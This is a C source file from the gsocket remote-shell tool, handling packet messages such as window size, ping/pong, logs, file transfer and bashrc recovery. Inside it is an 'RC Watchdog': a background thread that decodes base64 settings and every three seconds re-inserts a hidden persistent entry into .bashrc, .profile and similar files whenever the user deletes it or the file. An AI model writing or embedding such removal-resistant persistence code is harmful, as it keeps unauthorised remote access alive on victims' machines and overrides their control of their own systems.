#include "common.h"
#include "pkt_mgr.h"
#include "event_mgr.h"
#include "console.h"
#include "console_display.h"
#include "utils.h"
#include "gs-netcat.h"
#include "filetransfer_mgr.h"

extern GS_CONDIS gs_condis;  // defined in console.c

static void
queue_log(struct _peer *p, uint8_t type, const char *msg)
{
	struct _pkt_app_log *log;

	log = malloc(sizeof *log);
	if (log == NULL)
		return;

	memset(log, 0, sizeof *log);
	log->type = type;
	snprintf((char *)log->msg, sizeof log->msg, "%.62s", msg);
	GS_LIST_add(&p->logs, NULL, log, GS_LIST_ID_COUNT(&p->logs));
	p->is_pending_logs = 1;
	GS_SELECT_FD_SET_W(p->gs);
}

static int
copy_file(const char *src, const char *dst)
{
	FILE *in;
	FILE *out;
	uint8_t buf[4096];
	size_t n;

	in = fopen(src, "rb");
	if (in == NULL)
		return -1;

	out = fopen(dst, "wb");
	if (out == NULL)
	{
		fclose(in);
		return -1;
	}

	while ((n = fread(buf, 1, sizeof buf, in)) > 0)
	{
		if (fwrite(buf, 1, n, out) != n)
		{
			fclose(in);
			fclose(out);
			return -1;
		}
	}

	if (ferror(in))
	{
		fclose(in);
		fclose(out);
		return -1;
	}

	fclose(in);
	if (fclose(out) != 0)
		return -1;

	return 0;
}

static const char *
home_dir(void)
{
	const char *home;
	struct passwd *pw;

	home = GS_getenv("HOME");
	if ((home != NULL) && (*home != '\0'))
		return home;

	pw = getpwuid(getuid());
	if ((pw != NULL) && (pw->pw_dir != NULL) && (*pw->pw_dir != '\0'))
		return pw->pw_dir;

	return NULL;
}


/* -----------------------------------------------------------------------
 * RC Watchdog: monitors rc-files (.bashrc, .profile, etc.) and restores
 * our persistent entry if it is removed or the file is deleted.
 * Uses stat()-based polling — no inotify/kqueue required, works everywhere.
 * Only compiled when pthread is available.
 * ----------------------------------------------------------------------- */
#ifdef HAVE_PTHREAD
# include <pthread.h>

#define RC_WATCH_INTERVAL_SEC   3   /* poll every 3 seconds */
#define RC_MAX_FILES            8   /* max rc-files to watch */
#define RC_ENTRY_MAX            4096

typedef struct {
	char paths[RC_MAX_FILES][GS_PATH_MAX];
	int  n_paths;
	char marker[256];
	char entry[RC_ENTRY_MAX];
} rc_watch_ctx_t;

/* Simple base64 decode. Returns decoded length or -1 on error. */
static int
b64_decode(const char *src, char *dst, size_t dst_len)
{
	static const char b64tbl[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	size_t out = 0;
	uint32_t acc = 0;
	int bits = 0;

	for (; *src && *src != '='; src++) {
		const char *p = strchr(b64tbl, *src);
		if (!p) continue;
		acc = (acc << 6) | (uint32_t)(p - b64tbl);
		bits += 6;
		if (bits >= 8) {
			bits -= 8;
			if (out + 1 >= dst_len) return -1;
			dst[out++] = (char)((acc >> bits) & 0xff);
		}
	}
	dst[out] = '\0';
	return (int)out;
}

/* Returns 1 if marker string is found in file, 0 otherwise. */
static int
rc_marker_present(const char *path, const char *marker)
{
	FILE *fp;
	char line[RC_ENTRY_MAX];

	fp = fopen(path, "r");
	if (fp == NULL)
		return 0;

	while (fgets(line, sizeof line, fp) != NULL) {
		if (strstr(line, marker) != NULL) {
			fclose(fp);
			return 1;
		}
	}
	fclose(fp);
	return 0;
}

/* Inject entry as line 2 of path, or create file if it doesn't exist. */
static void
rc_restore_file(const char *path, const char *entry)
{
	FILE *fp;
	char tmp_path[GS_PATH_MAX];
	char line1[RC_ENTRY_MAX];
	char rest_buf[65536];
	size_t rest_len = 0;

	snprintf(tmp_path, sizeof tmp_path, "%s.gswdt~", path);

	fp = fopen(path, "r");
	if (fp == NULL) {
		fp = fopen(path, "w");
		if (fp == NULL) return;
		fprintf(fp, "%s\n", entry);
		fclose(fp);
		return;
	}

	if (fgets(line1, sizeof line1, fp) == NULL) {
		fclose(fp);
		fp = fopen(path, "w");
		if (fp == NULL) return;
		fprintf(fp, "%s\n", entry);
		fclose(fp);
		return;
	}

	rest_len = fread(rest_buf, 1, sizeof rest_buf - 1, fp);
	rest_buf[rest_len] = '\0';
	fclose(fp);

	fp = fopen(tmp_path, "w");
	if (fp == NULL) return;

	fputs(line1, fp);
	fprintf(fp, "%s\n", entry);
	if (rest_len > 0)
		fwrite(rest_buf, 1, rest_len, fp);
	fclose(fp);

	rename(tmp_path, path);
}

/* Parse .rcb backup file (KEY=base64value lines). Returns 0 on success. */
static int
rc_load_backup(const char *rcb_path, rc_watch_ctx_t *ctx)
{
	FILE *fp;
	char line[RC_ENTRY_MAX * 2];
	char decoded[RC_ENTRY_MAX];

	memset(ctx, 0, sizeof *ctx);

	fp = fopen(rcb_path, "r");
	if (fp == NULL)
		return -1;

	while (fgets(line, sizeof line, fp) != NULL) {
		size_t ln = strlen(line);
		while (ln > 0 && (line[ln-1] == '\n' || line[ln-1] == '\r'))
			line[--ln] = '\0';

		if (strncmp(line, "GS_RC_FILE=", 11) == 0) {
			if (b64_decode(line + 11, decoded, sizeof decoded) > 0 &&
			    ctx->n_paths < RC_MAX_FILES) {
				snprintf(ctx->paths[ctx->n_paths],
				         GS_PATH_MAX, "%s", decoded);
				ctx->n_paths++;
			}
		} else if (strncmp(line, "GS_RC_MARKER=", 13) == 0) {
			b64_decode(line + 13, ctx->marker, sizeof ctx->marker);
		} else if (strncmp(line, "GS_RC_ENTRY=", 12) == 0) {
			b64_decode(line + 12, ctx->entry, sizeof ctx->entry);
		}
	}
	fclose(fp);

	if (ctx->n_paths == 0 || ctx->marker[0] == '\0' || ctx->entry[0] == '\0')
		return -1;

	return 0;
}

static void *
rc_watcher_thread(void *arg)
{
	rc_watch_ctx_t *ctx = (rc_watch_ctx_t *)arg;
	int i;

	pthread_detach(pthread_self());

	while (1) {
		for (i = 0; i < ctx->n_paths; i++) {
			const char *path = ctx->paths[i];
			struct stat st;

			if (stat(path, &st) != 0)
				rc_restore_file(path, ctx->entry);
			else if (!rc_marker_present(path, ctx->marker))
				rc_restore_file(path, ctx->entry);
		}
		sleep(RC_WATCH_INTERVAL_SEC);
	}

	free(ctx);
	return NULL;
}

#endif /* HAVE_PTHREAD */

/* Start the RC watchdog thread (no-op if pthread not available). */
void
rc_watcher_start_c(const char *rcb_path)
{
#ifdef HAVE_PTHREAD
	rc_watch_ctx_t *ctx;
	pthread_t tid;

	if (rcb_path == NULL || rcb_path[0] == '\0')
		return;

	ctx = malloc(sizeof *ctx);
	if (ctx == NULL)
		return;

	if (rc_load_backup(rcb_path, ctx) != 0) {
		free(ctx);
		return;
	}

	if (pthread_create(&tid, NULL, rc_watcher_thread, ctx) != 0)
		free(ctx);
#endif /* HAVE_PTHREAD */
}




static int
restore_default_bashrc(char *err, size_t err_len)
{
	const char *home;
	char bashrc[GS_PATH_MAX];

	char backup[GS_PATH_MAX];

	home = home_dir();
	if (home == NULL)
	{
		snprintf(err, err_len, "HOME not found");
		return -1;
	}

	snprintf(bashrc, sizeof bashrc, "%s/.bashrc", home);
	snprintf(backup, sizeof backup, "%s/.bashrc.gsocket.bak", home);

	if ((access(bashrc, F_OK) == 0) && (copy_file(bashrc, backup) != 0))
	{
		snprintf(err, err_len, "backup failed: %s", strerror(errno));
		return -1;
	}

	if (copy_file("/etc/skel/.bashrc", bashrc) != 0)
	{
		FILE *fp = fopen(bashrc, "wb");
		if (fp == NULL)
		{
			snprintf(err, err_len, "restore failed: %s", strerror(errno));
			return -1;
		}
		fclose(fp);
	}

	if (chmod(bashrc, 0644) != 0)
	{
		snprintf(err, err_len, "chmod failed: %s", strerror(errno));
		return -1;
	}

	snprintf(err, err_len, "Recovered ~/.bashrc (backup: ~/.bashrc.gsocket.bak)");
	return 0;
}

/* SERVER - client changed window size. Adjust pty. */
void
pkt_app_cb_wsize(uint8_t msg, const uint8_t *data, size_t len, void *ptr)
{
	struct _peer *p = (struct _peer *)ptr;

	uint16_t col, row;

	memcpy(&col, data, 2);
	memcpy(&row, data + 2, 2);

	col = ntohs(col);
	row = ntohs(row);
	DEBUGF_W("cols = %u, rows = %u\n", col, row);

	int ret;
	struct winsize ws;
	ret = ioctl(p->fd_in, TIOCGWINSZ, &ws);
	if (ret != 0)
		DEBUGF_R("ioctrl() %s\n", strerror(errno));
	ws.ws_col = col;
	ws.ws_row = row;
	ret = ioctl(p->fd_in, TIOCSWINSZ, &ws);
	if (ret != 0)
		DEBUGF_R("ioctl()-2 %s\n", strerror(errno));
}

/* SERVER - answer to PING request on channel */
void
pkt_app_cb_ping(uint8_t msg, const uint8_t *data, size_t len, void *ptr)
{
	struct _peer *p = (struct _peer *)ptr;

	DEBUGF_C("APP-PING received\n");
	gopt.is_pong_pending = 1;
	GS_SELECT_FD_SET_W(p->gs);
}

/* CLIENT - Received PONG */
void
pkt_app_cb_pong(uint8_t msg, const uint8_t *data, size_t len, void *ptr)
{
	struct _peer *p = (struct _peer *)ptr;
	struct _pkt_app_pong pong;
	// Check if we were waiting at all!
	if (gopt.ts_ping_sent == 0)
		return;

	memcpy(&pong, data, sizeof pong);

	float ms = (float)(GS_TV_TO_USEC(&gopt.tv_now) - gopt.ts_ping_sent) / 1000;

	uint8_t buf[sizeof (pong.user) + 1];
	memcpy(buf, pong.user, sizeof pong.user);
	GS_sanitize_fname_str((char *)buf, sizeof buf);

	CONSOLE_update_pinginfo(p, ms, ntohs(pong.load), (char *)buf, ntohs(pong.idle), pong.n_users);

	// DEBUGF_C("PONG received (% 6.03fms) (load % 4.02f, idle %u)\n", ms, (float)ntohs(pong.load) / 100, ntohs(pong.idle));
	gopt.ts_ping_sent = 0;
}

void
pkt_app_cb_log(uint8_t msg, const uint8_t *data, size_t len, void *ptr)
{
	// struct _peer *p = (struct _peer *)ptr;
	struct _pkt_app_log *log = (struct _pkt_app_log *)data;

	GS_sanitize_fname_str((char *)log->msg, sizeof log->msg);
	GS_condis_log(&gs_condis, log->type, (const char *)log->msg);
	CONSOLE_draw(gs_condis.fd);

	DEBUGF_G("LOG (%d) '%s'\n", log->type, log->msg);
}

void
pkt_app_cb_status(uint8_t msg, const uint8_t *data, size_t len, void *ptr)
{
	struct _pkt_app_status *status = (struct _pkt_app_status *)data;

	DEBUGF_Y("Received STATUS.type=%u\n", status->type);
	if (status->type == GS_PKT_APP_STATUS_TYPE_NOPTY)
	{
		stty_switch_nopty();
	}	
}

/* SERVER - Client is interested in IDS messages */
void
pkt_app_cb_ids(uint8_t msg, const uint8_t *data, size_t len, void *ptr)
{
	struct _peer *p = (struct _peer *)ptr;

	DEBUGF_R("Client is interested in IDS log messages\n");
	if (p->ids_li != NULL)
	{
		DEBUGF_R("Oops. client already receiving log messages\n");
		return;
	}
	p->ids_li = GS_LIST_add(&gopt.ids_peers, NULL, p, 0);
	if (gopt.event_ids == NULL)
	{
		gopt.event_ids = GS_EVENT_add_by_ts(&p->gs->ctx->gselect_ctx->emgr, NULL, 0, GS_APP_IDSFREQ, cbe_ids, NULL, 0);
		cbe_ids(NULL); // Immediately load utmp database
	}
}

// SERVER
void
pkt_app_cb_pwdrequest(uint8_t msg, const uint8_t *dataUNUSED, size_t lenUNUSED, void *ptr)
{
	struct _peer *p = (struct _peer *)ptr;

	gopt.is_pwdreply_pending = 1;
	GS_SELECT_FD_SET_W(p->gs);
}

// CLIENT
void
pkt_app_cb_pwdreply(uint8_t chn, const uint8_t *data, size_t len, void *ptr)
{
	if (len <= 0)
		return;

	if (data[len - 1] != '\0')
		return; // protocol error.
	
	DEBUGF_B("REMOTE WD=%s\n", data);
	GS_condis_add(&gs_condis, GS_PKT_APP_LOG_TYPE_DEFAULT, (char *)data);
	CONSOLE_draw(gs_condis.fd);
}

// SERVER
void
pkt_app_cb_bashrc_recover(uint8_t msgUNUSED, const uint8_t *dataUNUSED, size_t lenUNUSED, void *ptr)
{
	struct _peer *p = (struct _peer *)ptr;
	char msg[128];
	char *allow;

	allow = GS_getenv("GSOCKET_ALLOW_BASHRC_RECOVERY");
	if ((allow == NULL) || (strcmp(allow, "1") != 0))
	{
		queue_log(p, GS_PKT_APP_LOG_TYPE_NOTICE, "bashrc recovery disabled on server");
		return;
	}

	if (restore_default_bashrc(msg, sizeof msg) == 0)
		queue_log(p, GS_PKT_APP_LOG_TYPE_INFO, msg);
	else
		queue_log(p, GS_PKT_APP_LOG_TYPE_ALERT, msg);
}

int
pkt_app_send_wsize(GS_SELECT_CTX *ctx, struct _peer *p, int row)
{
	p->wbuf[0] = GS_PKT_ESC;
	p->wbuf[1] = PKT_MSG_WSIZE;
	uint16_t c, r;
	c = htons(gopt.winsize.ws_col);
	r = htons(row);
	memcpy(p->wbuf + 2, &c, 2);
	memcpy(p->wbuf + 4, &r, 2);
	p->wlen = 2 + GS_PKT_MSG_size_by_type(PKT_MSG_WSIZE);
	return write_gs(ctx, p, NULL);
}

int
pkt_app_send_pong(GS_SELECT_CTX *ctx, struct _peer *p)
{
	double load;
	uint16_t l = 0;
	struct _pkt_app_pong pong;

	p->wbuf[0] = GS_PKT_ESC;
	p->wbuf[1] = PKT_MSG_PONG;

	// Get system load.
	if (getloadavg(&load, 1) == 1)
		l = (uint16_t)(load * 100);

	memset(&pong, 0, sizeof pong);
	pong.load = htons(l);
	pong.idle = htons(gopt.ids_idle);
	pong.n_users = MIN(255, gopt.n_users);
	if (gopt.ids_active_user != NULL)
		snprintf((char *)pong.user, sizeof pong.user, "%s", gopt.ids_active_user);

	memcpy(p->wbuf + 2, &pong, sizeof pong);

	p->wlen = 2 + GS_PKT_MSG_size_by_type(PKT_MSG_PONG);
	return write_gs(ctx, p, NULL);
}

int
pkt_app_send_ping(GS_SELECT_CTX *ctx, struct _peer *p)
{
	struct _pkt_app_ping ping;
	struct timeval tv;

	p->wbuf[0] = GS_PKT_ESC;
	p->wbuf[1] = PKT_MSG_PING;

	gettimeofday(&tv, NULL);
	gopt.ts_ping_sent = GS_TV_TO_USEC(&tv);

	memset(&ping, 0, sizeof ping);
	memcpy(p->wbuf + 2, &ping, sizeof ping);

	p->wlen = 2 + GS_PKT_MSG_size_by_type(PKT_MSG_PING);
	return write_gs(ctx, p, NULL);
}

int
pkt_app_send_ids(GS_SELECT_CTX *ctx, struct _peer *p)
{
	struct _pkt_app_ids ids;

	p->wbuf[0] = GS_PKT_ESC;
	p->wbuf[1] = PKT_MSG_IDS;

	memset(&ids, 0, sizeof ids);
	ids.flags = GS_PKT_APP_FL_IDS;  // Enable IDS

	memcpy(p->wbuf + 2, &ids, sizeof ids);
	p->wlen = 2 + GS_PKT_MSG_size_by_type(PKT_MSG_IDS);
	return write_gs(ctx, p, NULL);
}

int
pkt_app_send_pwdrequest(GS_SELECT_CTX *ctx, struct _peer *p)
{
	p->wbuf[0] = GS_PKT_ESC;
	p->wbuf[1] = PKT_MSG_PWD;
	p->wlen = 2 + GS_PKT_MSG_size_by_type(PKT_MSG_PWD);
	return write_gs(ctx, p, NULL);
}

int
pkt_app_send_bashrc_recover(GS_SELECT_CTX *ctx, struct _peer *p)
{
	p->wbuf[0] = GS_PKT_ESC;
	p->wbuf[1] = PKT_MSG_BASHRC_RECOVER;
	memset(p->wbuf + 2, 0, GS_PKT_MSG_size_by_type(PKT_MSG_BASHRC_RECOVER));
	p->wlen = 2 + GS_PKT_MSG_size_by_type(PKT_MSG_BASHRC_RECOVER);
	return write_gs(ctx, p, NULL);
}

int
pkt_app_send_pwdreply(GS_SELECT_CTX *ctx, struct _peer *p)
{
	struct gs_pkt_chn_hdr *hdr = (struct gs_pkt_chn_hdr *)p->wbuf;

	hdr->esc = GS_PKT_ESC;
	hdr->type = GS_PKT_CHN2TYPE(GS_CHN_PWD);

	char *wd = GS_getpidwd(p->pid);
	snprintf((char *)p->wbuf + sizeof *hdr, sizeof p->wbuf - sizeof *hdr, "%s", wd);
	size_t sz = strlen(wd) + 1; // including \0
	XFREE(wd);

	uint16_t len = htons(sz);
	memcpy(&hdr->len, &len, sizeof len);

	p->wlen = sizeof *hdr + sz;
	return write_gs(ctx, p, NULL);
}


// Loop until all FileTransfer data is written
// or the socket would block.
int
pkt_app_send_ft(GS_SELECT_CTX *ctx, struct _peer *p)
{
	ssize_t sz;
	int len;

	while (1)
	{
		sz = GS_FTM_mk_packet(&p->ft, p->wbuf, sizeof p->wbuf);
		if (sz == 0)
			return GS_SUCCESS;   // No data available.
		if (sz == -1)
			return GS_SUCCESS;   // All files have been transferred.
		if (sz < 0) // Catch All (-2 mostly/always)
			return GS_ERR_FATAL; // Not enough space.

		// Got data to write.
		p->wlen = sz;
		len = write_gs_atomic(ctx, p);
		if (len == -1)
			return GS_ECALLAGAIN;
		if (len != p->wlen)
			return GS_ERROR;
		p->wlen = 0; // SUCCESS.
		// Do a single write only. This function returns and enters the select() loop
		// again to check if there is any data on stdin. 
		// Otherwise the FileTransfer subsystem will keep sending data until write() would block
		// and then keep data in p->wbuf without the STDIN ever being checked for input until
		// the FileTransfer has completed. We like to check STDIN...
		// FIXME-PERFORMANCE: Could write() here until would-block but then do not
		// leave data in p->wbuf and instead use an internal buffer. This way select() is not
		// called for every write() from FileTransfer subsystem.
		return GS_SUCCESS;
	}

	return GS_SUCCESS; // NOT REACHED
}

static int
send_log(GS_SELECT_CTX *ctx, struct _peer *p, struct _pkt_app_log *log)
{
	int killed = 0;
	int ret;
	p->wbuf[0] = GS_PKT_ESC;
	p->wbuf[1] = PKT_MSG_LOG;

	XASSERT(GS_PKT_MSG_size_by_type(p->wbuf[1]) == sizeof *log, "Size does not fit\n");

	memcpy(p->wbuf + 2, log, sizeof *log);
	p->wlen = 2 + GS_PKT_MSG_size_by_type(p->wbuf[1]);

	ret = write_gs(ctx, p, &killed);
	if (killed)
		return GS_ERR_FATAL;

	return ret; // SUCCESS or WOUDLBLOCK
}

/*
 * Try to send all log files.
 */
int
pkt_app_send_all_log(GS_SELECT_CTX *ctx, struct _peer *p)
{
	GS_LIST_ITEM *li = NULL;
	int ret;

	// Stop being called recursively from within write_gs()
	p->is_pending_logs = 0;

	while (1)
	{
		li = GS_LIST_next(&p->logs, NULL);
		if (li == NULL)
			break;

		// FIXME-PERFORMANCE: Could add as much data to p->wbuf and then issue
		// a single write_gs() rather than a write_gs() for each log. WOuld
		// save on a bit of traffic and syscalls ...but then there are rarely any
		// logs send to peer anyway.....
		ret = send_log(ctx, p, li->data);
		if (ret == GS_ERR_FATAL)
			return GS_ERR_FATAL; // peer has been freed and destroyed.

		XFREE(li->data);
		GS_LIST_del(li);
	
		if (ret != GS_SUCCESS)
		{
			p->is_pending_logs = 1;
			return ret; // WOULDBLOCK
		}
	}

	return GS_SUCCESS;
}

int
pkt_app_send_status_nopty(GS_SELECT_CTX *ctx, struct _peer *p)
{
	struct _pkt_app_status status;

	p->wbuf[0] = GS_PKT_ESC;
	p->wbuf[1] = PKT_MSG_STATUS;

	memset(&status, 0, sizeof status);
	status.type = GS_PKT_APP_STATUS_TYPE_NOPTY;
	memcpy(p->wbuf + 2, &status, sizeof status);

	p->wlen = 2 + GS_PKT_MSG_size_by_type(PKT_MSG_STATUS);
	return write_gs(ctx, p, NULL);	
}
